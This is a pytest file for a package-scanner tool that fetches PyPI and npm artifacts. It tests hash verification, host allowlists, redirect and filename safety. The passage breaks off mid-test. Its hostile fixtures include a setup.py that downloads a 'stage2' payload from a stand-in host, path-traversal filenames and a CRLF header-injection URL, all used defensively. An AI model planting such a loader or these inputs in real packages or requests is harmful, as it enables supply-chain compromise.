"""Registry fetch for ``name==version`` (fetch.py and the cli flow).

Every test talks to a FAKE registry (an injected opener, or fake urllib
handlers behind the real OpenerDirector for the redirect tests); conftest makes
the real opener raise. The two ``network`` tests download real, well-known
artifacts (``pytest -m network``); nothing is ever installed or executed.
"""

from __future__ import annotations

import base64
import hashlib
import io
import json
import os
import tempfile
from http import client as httpclient
from pathlib import Path
from urllib import error as urlerror
from urllib import request as urlreq
from urllib import response as urlresp

import jsonschema
import pytest
from builders import TarItem, ZipItem, make_tar, make_zip

import eslabon.cli as cli
import eslabon.scan as scan
from eslabon import fetch, osv
from eslabon.model import FetchError, HashMismatch, Limits, LimitsExceeded

REPO = Path(__file__).parent.parent
SCHEMA = json.loads((REPO / "schema" / "event.schema.json").read_text("utf-8"))
FILES = "https://files.pythonhosted.org/packages/ab/cd"
NPM = "https://registry.npmjs.org"

PKG_INFO = b"Metadata-Version: 2.1\nName: requests\nVersion: 2.32.3\n\n"
SDIST = make_tar(
    [
        TarItem("requests-2.32.3/PKG-INFO", PKG_INFO),
        TarItem("requests-2.32.3/setup.py", b"from setuptools import setup\nsetup()\n"),
    ]
)
NPM_TGZ = make_tar(
    [
        TarItem("package/package.json", b'{"name": "left-pad", "version": "1.3.0"}'),
        TarItem("package/index.js", b"module.exports = 1;\n"),
    ]
)


# ---------------------------------------------------------------- fakes ----


class FakeResp:
    def __init__(self, url: str, body: bytes = b"", headers: dict | None = None):
        self.url = url
        self._buf = io.BytesIO(body)
        self.headers = httpclient.HTTPMessage()
        for k, v in (headers or {}).items():
            self.headers[k] = v
        self.closed = False

    def read(self, n: int = -1) -> bytes:
        return self._buf.read(n)

    def geturl(self) -> str:
        return self.url

    def close(self) -> None:
        self.closed = True

    def __enter__(self):
        return self

    def __exit__(self, *exc):
        self.close()


class Registry:
    """Fake opener: url -> bytes | FakeResp | Exception | callable(req)."""

    def __init__(self, routes: dict):
        self.routes = routes
        self.requests: list[urlreq.Request] = []

    def __call__(self, req, timeout):
        assert 0 < timeout <= fetch.TIMEOUT_S
        self.requests.append(req)
        item = self.routes.get(req.full_url)
        if item is None:
            raise urlerror.HTTPError(req.full_url, 404, "Not Found", {}, None)
        if isinstance(item, Exception):
            raise item
        if callable(item):
            return item(req)
        if isinstance(item, FakeResp):
            return item
        return FakeResp(req.full_url, item)

    @property
    def urls(self) -> list[str]:
        return [r.full_url for r in self.requests]


def _sha256(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


def _entry(filename: str, packagetype: str, data: bytes = b"") -> dict:
    return {
        "filename": filename,
        "packagetype": packagetype,
        "url": f"{FILES}/{filename}",
        "digests": {"sha256": _sha256(data), "md5": "0" * 32},
    }


def _pypi_doc(*entries: dict) -> bytes:
    return json.dumps({"info": {"name": "x"}, "urls": list(entries)}).encode()


def _sri(data: bytes, alg: str = "sha512") -> str:
    return f"{alg}-" + base64.b64encode(hashlib.new(alg, data).digest()).decode()


def _npm_doc(name: str, version: str, tarball: str, **dist) -> bytes:
    return json.dumps(
        {"name": name, "version": version, "dist": {"tarball": tarball, **dist}}
    ).encode()


def _pypi_registry(
    data: bytes = SDIST,
    filename: str = "requests-2.32.3.tar.gz",
    packagetype: str = "sdist",
    sha: str | None = None,
) -> Registry:
    entry = _entry(filename, packagetype, data)
    if sha is not None:
        entry["digests"]["sha256"] = sha
    return Registry(
        {
            "https://pypi.org/pypi/requests/2.32.3/json": _pypi_doc(entry),
            entry["url"]: data,
        }
    )


# -------------------------------------------------------------- resolve ----


SDIST_E = _entry("pkg-1.0.tar.gz", "sdist")
ANY_E = _entry("pkg-1.0-py3-none-any.whl", "bdist_wheel")
PY2PY3_E = _entry("pkg-1.0-py2.py3-none-any.whl", "bdist_wheel")
CP312_E = _entry("pkg-1.0-cp312-cp312-manylinux_2_17_x86_64.whl", "bdist_wheel")
CP313_WIN_E = _entry("pkg-1.0-cp313-cp313-win_amd64.whl", "bdist_wheel")
CP313_ARM_E = _entry("pkg-1.0-cp313-cp313-manylinux_2_17_aarch64.whl", "bdist_wheel")
CP313_E = _entry(
    "pkg-1.0-cp313-cp313-manylinux_2_17_x86_64.manylinux2014_x86_64.whl",
    "bdist_wheel",
)
MAC_E = _entry("pkg-1.0-cp311-cp311-macosx_11_0_arm64.whl", "bdist_wheel")
EGG_E = _entry("pkg-1.0-py3.8.egg", "bdist_egg")


@pytest.mark.parametrize(
    ("entries", "picked"),
    [
        ([CP313_E, ANY_E, SDIST_E], SDIST_E),
        ([CP313_E, ANY_E], ANY_E),
        ([CP313_E, PY2PY3_E], PY2PY3_E),  # wheel-only release: py3-none-any
        ([CP312_E, CP313_WIN_E, CP313_ARM_E, CP313_E, MAC_E], CP313_E),
        ([EGG_E, MAC_E, CP312_E], MAC_E),  # else the first wheel listed
        ([EGG_E], None),
    ],
)
def test_pypi_prefers_sdist_then_py3_none_any_then_cp313_manylinux(entries, picked):
    assert fetch.pick_pypi_file(entries) == picked
    reg = Registry({"https://pypi.org/pypi/pkg/1.0/json": _pypi_doc(*entries)})
    if picked is None:
        with pytest.raises(FetchError):
            fetch.resolve("pkg", "1.0", "pypi", opener=reg)
        return
    a = fetch.resolve("pkg", "1.0", "pypi", opener=reg)
    assert a == fetch.Artifact(
        picked["url"], picked["filename"], "sha256", picked["digests"]["sha256"]
    )


def test_pypi_wheel_only_release_picks_py3_none_any():
    reg = Registry(
        {"https://pypi.org/pypi/pkg/1.0/json": _pypi_doc(MAC_E, CP313_E, ANY_E)}
    )
    assert fetch.resolve("pkg", "1.0", "pypi", opener=reg).filename == ANY_E["filename"]


def test_django_uppercase_resolves_url():
    url = "https://pypi.org/pypi/django/5.0.1/json"
    entry = _entry("django-5.0.1.tar.gz", "sdist")
    reg = Registry({url: _pypi_doc(entry)})
    assert fetch.resolve("Django", "5.0.1", "pypi", opener=reg).url == entry["url"]
    assert reg.urls == [url]
    assert fetch.pypi_url("Foo_Bar.baz", "1.0") == (
        "https://pypi.org/pypi/foo-bar-baz/1.0/json"
    )
    assert (
        fetch.pypi_url("x", "1.0+local!")
        == "https://pypi.org/pypi/x/1.0%2Blocal%21/json"
    )


def test_request_headers_user_agent_and_identity_encoding():
    reg = _pypi_registry()
    fetch.resolve("requests", "2.32.3", "pypi", opener=reg)
    req = reg.requests[0]
    assert req.get_method() == "GET"
    assert req.get_header("User-agent") == f"eslabon/{fetch.__version__}"
    assert req.get_header("Accept-encoding") == "identity"


def test_npm_scoped_name_encoded():
    data = NPM_TGZ
    tarball = f"{NPM}/@types/node/-/node-20.1.0.tgz"
    url = f"{NPM}/@types%2fnode/20.1.0"
    reg = Registry(
        {url: _npm_doc("@types/node", "20.1.0", tarball, integrity=_sri(data))}
    )
    a = fetch.resolve("@types/node", "20.1.0", "npm", opener=reg)
    assert reg.urls == [url]
    assert a == fetch.Artifact(
        tarball, "node-20.1.0.tgz", "sha512", hashlib.sha512(data).hexdigest()
    )
    assert fetch.npm_url("left-pad", "1.3.0") == f"{NPM}/left-pad/1.3.0"


def test_npm_integrity_with_multiple_entries_picks_sha512():
    data = NPM_TGZ
    sri = f"{_sri(data, 'sha1')} {_sri(b'other', 'sha384')}  {_sri(data)}?opt"
    assert fetch.parse_integrity(sri) == hashlib.sha512(data).hexdigest()
    assert fetch.parse_integrity(_sri(data, "sha1")) is None
    with pytest.raises(FetchError):
        fetch.parse_integrity("sha512-not*base64")
    with pytest.raises(FetchError):
        fetch.parse_integrity("sha512-" + base64.b64encode(b"short").decode())


def test_npm_sha1_only_accepted_with_anomaly(tmp_path):
    data = NPM_TGZ
    tarball = f"{NPM}/left-pad/-/left-pad-1.3.0.tgz"
    doc = _npm_doc(
        "left-pad",
        "1.3.0",
        tarball,
        shasum=hashlib.sha1(data, usedforsecurity=False).hexdigest(),
    )
    reg = Registry({f"{NPM}/left-pad/1.3.0": doc, tarball: data})
    a = fetch.resolve("left-pad", "1.3.0", "npm", opener=reg)
    assert (a.hash_alg, a.hash_value) == (
        "sha1",
        hashlib.sha1(data, usedforsecurity=False).hexdigest(),
    )
    path, anomalies = fetch.download(a, tmp_path, Limits(), opener=reg)
    assert path.read_bytes() == data
    assert [x.kind for x in anomalies] == ["weak_hash_sha1"]
    # sha1 is still verified
    bad = fetch.Artifact(a.url, a.filename, "sha1", "0" * 40)
    other = tmp_path / "other"
    other.mkdir()
    with pytest.raises(HashMismatch):
        fetch.download(bad, other, Limits(), opener=reg)
    assert os.listdir(other) == []


def test_npm_without_any_usable_hash_is_fetch_error():
    tarball = f"{NPM}/a/-/a-1.0.0.tgz"
    reg = Registry({f"{NPM}/a/1.0.0": _npm_doc("a", "1.0.0", tarball)})
    with pytest.raises(FetchError):
        fetch.resolve("a", "1.0.0", "npm", opener=reg)


@pytest.mark.parametrize(
    "url",
    [
        "https://evil.example/pkg-1.0.tar.gz",
        "http://files.pythonhosted.org/pkg-1.0.tar.gz",
        "https://files.pythonhosted.org.evil.example/pkg-1.0.tar.gz",
        "https://user@files.pythonhosted.org/pkg-1.0.tar.gz",
        "file:///etc/passwd",
    ],
)
def test_dist_url_off_allowlist_rejected_before_download(url):
    entry = dict(SDIST_E, url=url)
    reg = Registry({"https://pypi.org/pypi/pkg/1.0/json": _pypi_doc(entry)})
    with pytest.raises(FetchError):
        fetch.resolve("pkg", "1.0", "pypi", opener=reg)
    assert len(reg.requests) == 1  # only the registry JSON was requested


@pytest.mark.parametrize(
    "body",
    [b"not json", b"[1, 2]", b"[" * 100000 + b"]" * 100000, b'{"urls": "x"}'],
    ids=["syntax", "array", "deep", "urls_not_list"],
)
def test_registry_json_parsed_defensively(body):
    reg = Registry({"https://pypi.org/pypi/pkg/1.0/json": body})
    with pytest.raises(FetchError):
        fetch.resolve("pkg", "1.0", "pypi", opener=reg)


def test_registry_json_capped_while_reading(monkeypatch):
    monkeypatch.setattr(fetch, "MAX_JSON", 1000)
    body = b'{"urls": []' + b" " * 2000 + b"}"
    reg = Registry({"https://pypi.org/pypi/pkg/1.0/json": body})
    with pytest.raises(FetchError, match="too large"):
        fetch.resolve("pkg", "1.0", "pypi", opener=reg)


@pytest.mark.parametrize(
    "bad", [("..", "1.0"), ("pkg", ".."), ("a/b", "1"), ("pkg", "1 0")]
)
def test_resolve_revalidates_name_and_version(bad):
    with pytest.raises(FetchError):
        fetch.resolve(*bad, "pypi", opener=Registry({}))


def test_http_errors_become_fetch_error():
    url = "https://pypi.org/pypi/pkg/1.0/json"
    for exc in (urlerror.URLError("down"), TimeoutError(), ConnectionResetError()):
        with pytest.raises(FetchError):
            fetch.resolve("pkg", "1.0", "pypi", opener=Registry({url: exc}))
    with pytest.raises(FetchError, match="http 404"):
        fetch.resolve("pkg", "1.0", "pypi", opener=Registry({}))


# ------------------------------------------------------------- download ----


def _artifact(data: bytes = SDIST, filename: str = "requests-2.32.3.tar.gz"):
    return fetch.Artifact(f"{FILES}/{filename}", filename, "sha256", _sha256(data))


def test_download_writes_only_the_archive_into_dest(tmp_path):
    a = _artifact()
    reg = Registry({a.url: SDIST})
    path, anomalies = fetch.download(a, tmp_path, Limits(), opener=reg)
    assert path == tmp_path / "requests-2.32.3.tar.gz"
    assert path.read_bytes() == SDIST
    assert anomalies == []
    assert os.listdir(tmp_path) == ["requests-2.32.3.tar.gz"]
    assert reg.requests[0].get_header("Accept-encoding") == "identity"


def test_hash_mismatch_raises_and_removes_file(tmp_path):
    a = fetch.Artifact(f"{FILES}/p-1.tar.gz", "p-1.tar.gz", "sha256", "0" * 64)
    with pytest.raises(HashMismatch) as info:
        fetch.download(a, tmp_path, Limits(), opener=Registry({a.url: SDIST}))
    assert info.value.actual_sha256 == _sha256(SDIST)
    assert os.listdir(tmp_path) == []


def test_download_over_cap_rejected_ignoring_content_length(tmp_path):
    data = b"x" * 1001
    a = _artifact(data)
    resp = FakeResp(a.url, data, {"Content-Length": "10"})  # a lie
    with pytest.raises(LimitsExceeded):
        fetch.download(
            a, tmp_path, Limits(max_download=1000), opener=Registry({a.url: resp})
        )
    assert os.listdir(tmp_path) == []
    assert resp.closed
    # exactly at the cap is fine, whatever Content-Length claims
    a2 = _artifact(data[:1000])
    resp2 = FakeResp(a2.url, data[:1000], {"Content-Length": "999999999"})
    path, _ = fetch.download(
        a2, tmp_path, Limits(max_download=1000), opener=Registry({a2.url: resp2})
    )
    assert path.stat().st_size == 1000


@pytest.mark.parametrize("encoding", ["gzip", "deflate", "br"])
def test_content_encoding_refused(tmp_path, encoding):
    a = _artifact()
    resp = FakeResp(a.url, SDIST, {"Content-Encoding": encoding})
    with pytest.raises(FetchError, match="Content-Encoding"):
        fetch.download(a, tmp_path, Limits(), opener=Registry({a.url: resp}))
    assert os.listdir(tmp_path) == []
    reg = Registry(
        {
            "https://pypi.org/pypi/pkg/1.0/json": FakeResp(
                "https://pypi.org/pypi/pkg/1.0/json",
                b"{}",
                {"Content-Encoding": encoding},
            )
        }
    )
    with pytest.raises(FetchError, match="Content-Encoding"):
        fetch.resolve("pkg", "1.0", "pypi", opener=reg)


def test_final_url_off_allowlist_rejected(tmp_path):
    a = _artifact()
    resp = FakeResp("https://evil.example/x.tar.gz", SDIST)
    with pytest.raises(FetchError):
        fetch.download(a, tmp_path, Limits(), opener=Registry({a.url: resp}))
    assert os.listdir(tmp_path) == []


def test_download_deadline_checked_while_reading(tmp_path, monkeypatch):
    now = [0.0]
    monkeypatch.setattr(fetch, "_clock", lambda: now[0])
    data = b"y" * (5 * fetch._CHUNK)
    a = _artifact(data)

    class Slow(FakeResp):
        def read(self, n=-1):
            now[0] += 100.0
            return super().read(n)

    with pytest.raises(FetchError, match="deadline"):
        fetch.download(
            a,
            tmp_path,
            Limits(),
            opener=Registry({a.url: Slow(a.url, data)}),
            deadline=250.0,
        )
    assert os.listdir(tmp_path) == []


@pytest.mark.parametrize(
    ("raw", "safe"),
    [
        ("requests-2.32.3.tar.gz", "requests-2.32.3.tar.gz"),
        ("../../evil-1.0.tar.gz", "evil-1.0.tar.gz"),
        ("..\\..\\Windows\\evil-1.0-py3-none-any.whl", "evil-1.0-py3-none-any.whl"),
        ("C:evil.tgz", "C_evil.tgz"),
        ("a:stream.zip", "a_stream.zip"),
        ("caf" + chr(0xE9) + "-1.0.tar.gz", "caf_-1.0.tar.gz"),
        ("..", "artifact"),
        (".tgz", "artifact.tgz"),
        ("...hidden.whl", "hidden.whl"),
        ("CON.tar.gz", "_CON.tar.gz"),
        ("nul.whl", "_nul.whl"),
        ("x\x00y.tgz", "x_y.tgz"),
        ("", "artifact"),
    ],
)
def test_safe_filename(raw, safe):
    assert fetch.safe_filename(raw) == safe


def test_safe_filename_caps_length_and_keeps_suffix():
    name = fetch.safe_filename("a" * 5000 + ".tar.gz")
    assert len(name) == fetch.MAX_FILENAME and name.endswith(".tar.gz")
    assert fetch.safe_filename("b" * 5000) == "b" * fetch.MAX_FILENAME


def test_hostile_filename_cannot_leave_dest(tmp_path):
    dest = tmp_path / "dest"
    dest.mkdir()
    for raw in ("../escape.tar.gz", "..\\escape.tar.gz", "/abs/escape.tgz"):
        a = fetch.Artifact(f"{FILES}/x", raw, "sha256", _sha256(SDIST))
        path, _ = fetch.download(a, dest, Limits(), opener=Registry({a.url: SDIST}))
        assert path.parent == dest
        path.unlink()
    assert os.listdir(tmp_path) == ["dest"]


# ------------------------------------------------------------ redirects ----


class FakeHTTPS(urlreq.HTTPSHandler):
    """Serves https://... from a route table through the real OpenerDirector,
    so urllib's own redirect machinery (and our _SafeRedirect) runs."""

    def __init__(self, routes: dict):
        super().__init__()
        self.routes = routes
        self.seen: list[str] = []

    def https_open(self, req):
        self.seen.append(req.full_url)
        code, location, body = self.routes[req.full_url]
        headers = httpclient.HTTPMessage()
        if location:
            headers["Location"] = location
        resp = urlresp.addinfourl(io.BytesIO(body), headers, req.full_url, code)
        resp.msg = "Found" if location else "OK"
        return resp


class NoHTTP(urlreq.HTTPHandler):
    def http_open(self, req):
        raise AssertionError(f"plain http reached: {req.full_url}")


def _urllib_with(routes: dict) -> tuple[FakeHTTPS, object]:
    https = FakeHTTPS(routes)

    def opener(req, timeout):
        return fetch.build_opener(https, NoHTTP()).open(req, timeout=timeout)

    return https, opener


def test_redirect_within_allowlist_followed(tmp_path):
    a = _artifact()
    other = "https://files.pythonhosted.org/real/requests-2.32.3.tar.gz"
    https, opener = _urllib_with({a.url: (302, other, b""), other: (200, None, SDIST)})
    path, _ = fetch.download(a, tmp_path, Limits(), opener=opener)
    assert path.read_bytes() == SDIST
    assert https.seen == [a.url, other]


@pytest.mark.parametrize(
    "target",
    [
        "https://evil.example/x.tar.gz",
        "https://pypi.org.evil.example/x",
        "ftp://files.pythonhosted.org/x",
    ],
)
def test_redirect_to_other_host_rejected(tmp_path, target):
    a = _artifact()
    hop = "https://pypi.org/hop"
    https, opener = _urllib_with(
        {a.url: (301, hop, b""), hop: (302, target, b""), target: (200, None, SDIST)}
    )
    with pytest.raises(FetchError, match="allowed registry host"):
        fetch.download(a, tmp_path, Limits(), opener=opener)
    assert https.seen == [a.url, hop]  # checked on every hop, target never opened
    assert os.listdir(tmp_path) == []


def test_redirect_to_http_rejected(tmp_path):
    a = _artifact()
    target = "http://files.pythonhosted.org/x.tar.gz"
    https, opener = _urllib_with({a.url: (302, target, b"")})
    with pytest.raises(FetchError, match="allowed registry host"):
        fetch.download(a, tmp_path, Limits(), opener=opener)
    assert https.seen == [a.url]
    # and on the registry JSON too
    url = "https://pypi.org/pypi/pkg/1.0/json"
    _, opener = _urllib_with({url: (307, "http://pypi.org/pypi/pkg/1.0/json", b"")})
    with pytest.raises(FetchError):
        fetch.resolve("pkg", "1.0", "pypi", opener=opener)


def test_redirect_handler_unit():
    h = fetch._SafeRedirect()
    req = urlreq.Request("https://pypi.org/a")
    for bad in ("http://pypi.org/b", "https://evil.example/b", "https://pypi.org:x/b"):
        with pytest.raises(FetchError):
            h.redirect_request(req, None, 302, "Found", {}, bad)
    new = h.redirect_request(req, None, 302, "Found", {}, "https://pypi.org/b")
    assert new.full_url == "https://pypi.org/b"


def test_allowed_hosts_exact():
    assert fetch.ALLOWED_HOSTS == {
        "pypi.org",
        "files.pythonhosted.org",
        "registry.npmjs.org",
    }
    assert fetch.TIMEOUT_S == 30.0


# ------------------------------------------------------------------ cli ----


@pytest.fixture
def track(monkeypatch):
    """Record the temp dirs the cli makes and the files download() returns."""
    seen: dict[str, list] = {"dirs": [], "files": []}
    real_mkdtemp, real_download = tempfile.mkdtemp, fetch.download

    def mkdtemp(*args, **kwargs):
        d = real_mkdtemp(*args, **kwargs)
        seen["dirs"].append(Path(d))
        return d

    def download(*args, **kwargs):
        path, anomalies = real_download(*args, **kwargs)
        seen["files"].append(path)
        return path, anomalies

    monkeypatch.setattr(cli.tempfile, "mkdtemp", mkdtemp)
    monkeypatch.setattr(fetch, "download", download)
    return seen


def _events(out: Path) -> list[dict]:
    events = [json.loads(line) for line in out.read_text("ascii").splitlines()]
    for ev in events:
        jsonschema.validate(ev, SCHEMA)
    return events


def _summary(out: Path) -> dict:
    return _events(out)[-1]


def _assert_cleaned(track, cwd: Path) -> None:
    assert len(track["dirs"]) == 1
    tmp = track["dirs"][0]
    assert not tmp.exists()  # removed after the scan
    assert REPO.resolve() not in tmp.resolve().parents  # never inside the repo
    assert cwd.resolve() not in tmp.resolve().parents


@pytest.fixture
def out(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    return tmp_path / "out" / "e.jsonl"


def _main(target: str, out: Path, *extra: str) -> int:
    return cli.main(["scan", target, "--out", str(out), *extra])


def test_cli_name_version_pypi_end_to_end(out, monkeypatch, track):
    monkeypatch.setattr(fetch, "DEFAULT_OPENER", _pypi_registry())
    assert _main("requests==2.32.3", out, "--ecosystem", "pypi", "--offline") == 0
    s = _summary(out)
    assert s["package"] == {"name": "requests", "version": "2.32.3"}
    assert s["file"]["hash"]["sha256"] == _sha256(SDIST)
    assert s["eslabon"]["identity_source"] == "argument"
    assert s["eslabon"]["scan"]["status"] == "ok"
    assert s["eslabon"]["scan"]["files_scanned"] == 2
    # the temp file kept the registry suffix, and is gone with its directory
    assert [p.name for p in track["files"]] == ["requests-2.32.3.tar.gz"]
    assert track["files"][0].parent == track["dirs"][0]
    _assert_cleaned(track, out.parent.parent)
    assert sorted(os.listdir(out.parent.parent)) == ["out"]


def test_cli_registry_suffix_drives_archive_kind(out, monkeypatch, track):
    whl = make_zip([ZipItem("requests-2.32.3.dist-info/METADATA", PKG_INFO)])
    name = "requests-2.32.3-py3-none-any.whl"
    monkeypatch.setattr(
        fetch, "DEFAULT_OPENER", _pypi_registry(whl, name, "bdist_wheel")
    )
    kinds = []
    real = cli.run_isolated

    def spy(fn, args, timeout_s):
        kinds.append(scan.archive_kind(args[0], args[1].ecosystem))
        return real(fn, args, timeout_s=timeout_s)

    monkeypatch.setattr(cli, "run_isolated", spy)
    assert _main("requests==2.32.3", out, "--ecosystem", "pypi", "--offline") == 0
    assert kinds == ["wheel"]
    assert [p.name for p in track["files"]] == [name]
    assert "no_metadata" not in _summary(out)["eslabon"]["scan"]["anomaly_kinds"]
    _assert_cleaned(track, out.parent.parent)


def test_cli_registry_sdist_gets_esl001(out, monkeypatch, track):
    # ESL-001 runs on sdists only: it firing proves archive_kind was "sdist"
    nl = chr(10)
    setup_py = nl.join(
        [
            "from urllib" + ".request import url" + "open",
            "payload = url" + "open('https" + "://example.invalid/stage2').read()",
            "",
        ]
    ).encode("ascii")
    sdist = make_tar(
        [
            TarItem("requests-2.32.3/PKG-INFO", PKG_INFO),
            TarItem("requests-2.32.3/setup.py", setup_py),
        ]
    )
    monkeypatch.setattr(fetch, "DEFAULT_OPENER", _pypi_registry(sdist))
    assert _main("requests==2.32.3", out, "--ecosystem", "pypi", "--offline") == 1
    events = _events(out)
    assert [e["rule"]["id"] for e in events[:-1]] == ["ESL-001"]
    _assert_cleaned(track, out.parent.parent)


def test_hash_mismatch_exit_2(out, monkeypatch, track, capsys):
    monkeypatch.setattr(fetch, "DEFAULT_OPENER", _pypi_registry(sha="0" * 64))
    assert _main("requests==2.32.3", out, "--ecosystem", "pypi", "--offline") == 2
    s = _summary(out)
    assert s["eslabon"]["scan"]["status"] == "hash_mismatch"
    assert s["file"]["hash"]["sha256"] == _sha256(SDIST)  # what we actually got
    assert s["package"] == {"name": "requests", "version": "2.32.3"}
    assert s["eslabon"]["identity_source"] == "argument"
    assert capsys.readouterr().err == ""
    assert track["files"] == []
    _assert_cleaned(track, out.parent.parent)  # removed on error too


def test_cli_npm_sha1_only_records_anomaly(out, monkeypatch, track):
    tarball = f"{NPM}/left-pad/-/left-pad-1.3.0.tgz"
    doc = _npm_doc(
        "left-pad",
        "1.3.0",
        tarball,
        shasum=hashlib.sha1(NPM_TGZ, usedforsecurity=False).hexdigest(),
    )
    monkeypatch.setattr(
        fetch,
        "DEFAULT_OPENER",
        Registry({f"{NPM}/left-pad/1.3.0": doc, tarball: NPM_TGZ}),
    )
    assert _main("left-pad==1.3.0", out, "--ecosystem", "npm", "--offline") == 0
    sc = _summary(out)["eslabon"]["scan"]
    assert sc["status"] == "ok"
    assert "weak_hash_sha1" in sc["anomaly_kinds"]
    _assert_cleaned(track, out.parent.parent)


def test_cli_download_over_cap_limits_exceeded(out, monkeypatch, track):
    monkeypatch.setattr(cli, "Limits", lambda: Limits(max_download=100))
    monkeypatch.setattr(fetch, "DEFAULT_OPENER", _pypi_registry())
    assert _main("requests==2.32.3", out, "--ecosystem", "pypi", "--offline") == 2
    s = _summary(out)
    assert s["eslabon"]["scan"]["status"] == "limits_exceeded"
    assert "file" not in s
    _assert_cleaned(track, out.parent.parent)


def test_cli_fetch_error_still_summarises_and_checks_the_name(out, monkeypatch, track):
    monkeypatch.setattr(fetch, "DEFAULT_OPENER", Registry({}))  # 404 everywhere
    queries = []

    def osv_opener(url, data, timeout):
        queries.append(json.loads(data)["package"]["name"])
        return osv.API_URL, b"{}"

    monkeypatch.setattr(osv, "DEFAULT_OPENER", osv_opener)
    assert _main("requests==2.32.3", out, "--ecosystem", "pypi") == 2
    s = _summary(out)
    assert s["eslabon"]["scan"]["status"] == "fetch_error"
    assert s["eslabon"]["scan"]["error"] == "fetch: http 404"
    assert s["eslabon"]["scan"]["osv_status"] == "ok"
    assert queries == ["requests"]  # a fetch failure cannot switch ESL-006 off
    _assert_cleaned(track, out.parent.parent)


def test_cli_worker_error_still_removes_temp_dir(out, monkeypatch, track):
    def boom(fn, args, timeout_s):
        assert args[0].is_file()  # the worker gets the downloaded file
        raise OSError("spawn failed")

    monkeypatch.setattr(cli, "run_isolated", boom)
    monkeypatch.setattr(fetch, "DEFAULT_OPENER", _pypi_registry())
    assert _main("requests==2.32.3", out, "--ecosystem", "pypi", "--offline") == 2
    assert _summary(out)["eslabon"]["scan"]["status"] == "parse_error"
    _assert_cleaned(track, out.parent.parent)


def test_cli_argument_vs_metadata_mismatch_checks_both(out, monkeypatch, track):
    evil = make_tar(
        [
            TarItem(
                "evil-6.6.6/PKG-INFO",
                b"Metadata-Version: 2.1\nName: evil\nVersion: 6.6.6\n\n",
            )
        ]
    )
    monkeypatch.setattr(fetch, "DEFAULT_OPENER", _pypi_registry(evil))
    queries = []

    def osv_opener(url, data, timeout):
        q = json.loads(data)
        queries.append((q["package"]["name"], q.get("version")))
        return osv.API_URL, b"{}"

    monkeypatch.setattr(osv, "DEFAULT_OPENER", osv_opener)
    assert _main("requests==2.32.3", out, "--ecosystem", "pypi") == 0
    s = _summary(out)
    assert s["package"] == {"name": "requests", "version": "2.32.3"}
    assert "identity_mismatch" in s["eslabon"]["scan"]["anomaly_kinds"]
    assert queries == [("requests", "2.32.3"), ("evil", "6.6.6")]


def test_cli_argument_same_name_other_version_queries_both(out, monkeypatch, track):
    other = make_tar(
        [
            TarItem(
                "Requests-9.9/PKG-INFO",
                b"Metadata-Version: 2.1\nName: Requests\nVersion: 9.9\n\n",
            )
        ]
    )
    monkeypatch.setattr(fetch, "DEFAULT_OPENER", _pypi_registry(other))
    queries = []

    def osv_opener(url, data, timeout):
        q = json.loads(data)
        queries.append((q["package"]["name"], q.get("version")))
        return osv.API_URL, b"{}"

    monkeypatch.setattr(osv, "DEFAULT_OPENER", osv_opener)
    assert _main("requests==2.32.3", out, "--ecosystem", "pypi") == 0
    s = _summary(out)
    assert "identity_mismatch" not in s["eslabon"]["scan"]["anomaly_kinds"]
    assert queries == [("requests", "2.32.3"), ("requests", "9.9")]


@pytest.mark.parametrize(
    "target",
    [
        "requests=2",
        "requests==",
        "==1.0",
        "requests==1.0==2",
        "a b==1",
        "@Scope/x==1",
        "requests==1.0\n",
        "../x==1",
        "..==1.0",
        "x==..",
        "@s/..==1",
    ],
)
def test_bad_target_syntax_exit_2(target, out, capsys, track):
    assert _main(target, out, "--ecosystem", "pypi") == 2
    err = capsys.readouterr().err
    assert err.count("\n") == 1 and err.startswith("eslabon: error:")
    assert not out.exists()
    assert track["dirs"] == []


def test_name_version_requires_ecosystem(out, capsys, track):
    assert _main("requests==2.32.3", out) == 2
    assert "--ecosystem" in capsys.readouterr().err
    assert not out.exists() and track["dirs"] == []


def test_scoped_name_is_npm_only(out, capsys, track):
    assert _main("@types/node==20.1.0", out, "--ecosystem", "pypi") == 2
    assert capsys.readouterr().err.count("\n") == 1
    assert not out.exists() and track["dirs"] == []


def test_existing_file_wins_over_name_version_syntax(out, monkeypatch):
    (out.parent.parent / "left-pad==1.3.0").write_bytes(NPM_TGZ)
    monkeypatch.setattr(fetch, "resolve", lambda *a, **k: pytest.fail("fetched"))
    assert _main("left-pad==1.3.0", out, "--ecosystem", "npm", "--offline") == 0
    assert _summary(out)["eslabon"].get("identity_source") == "metadata"


# -------------------------------------------------------------- network ----


REQUESTS_SDIST_SHA256 = (
    "55365417734eb18255590a9ff9eb97e9e1da868d4ccd6402399eaf68af20a760"
)


@pytest.mark.network
def test_real_requests_2_32_3_hash_verified(tmp_path):
    a = fetch.resolve("requests", "2.32.3", "pypi", opener=fetch.urllib_opener)
    assert a.filename == "requests-2.32.3.tar.gz"
    assert (a.hash_alg, a.hash_value) == ("sha256", REQUESTS_SDIST_SHA256)
    path, anomalies = fetch.download(a, tmp_path, Limits(), opener=fetch.urllib_opener)
    assert anomalies == []
    assert hashlib.sha256(path.read_bytes()).hexdigest() == REQUESTS_SDIST_SHA256


@pytest.mark.network
def test_real_npm_ms_2_1_3_hash_verified(tmp_path):
    a = fetch.resolve("ms", "2.1.3", "npm", opener=fetch.urllib_opener)
    assert (a.filename, a.hash_alg) == ("ms-2.1.3.tgz", "sha512")
    path, anomalies = fetch.download(a, tmp_path, Limits(), opener=fetch.urllib_opener)
    assert anomalies == []
    assert hashlib.sha512(path.read_bytes()).hexdigest() == a.hash_value


# ------------------------------------------------- fix round 1 (R49) ----


@pytest.mark.parametrize(
    "url",
    [
        "https://pypi.org:8443/x",
        "https://pypi.org:0/x",
        "https://files.pythonhosted.org:444/x",
        "https://registry.npmjs.org:80/x",
    ],
)
def test_only_default_https_port_allowed(url):
    with pytest.raises(FetchError):
        fetch._check_url(url)
    h = fetch._SafeRedirect()
    req = urlreq.Request("https://pypi.org/a")
    with pytest.raises(FetchError):
        h.redirect_request(req, None, 302, "Found", {}, url)


def test_explicit_443_allowed():
    fetch._check_url("https://pypi.org:443/x")
    fetch._check_url("https://files.pythonhosted.org/x")


@pytest.mark.parametrize(
    "url",
    [
        "https://pyp" + chr(10) + "i.org/x",
        "https://pypi.org/x" + chr(13) + chr(10) + "Host: evil",
        chr(9) + "https://pypi.org/x",
        "https://pypi.org/a b",
        "https://pypi.org/x" + chr(0),
        "https://pypi.org/x" + chr(0x7F),
        "https://pypi.org/x" + chr(0x1F),
    ],
)
def test_control_chars_and_spaces_rejected_before_urlsplit(url):
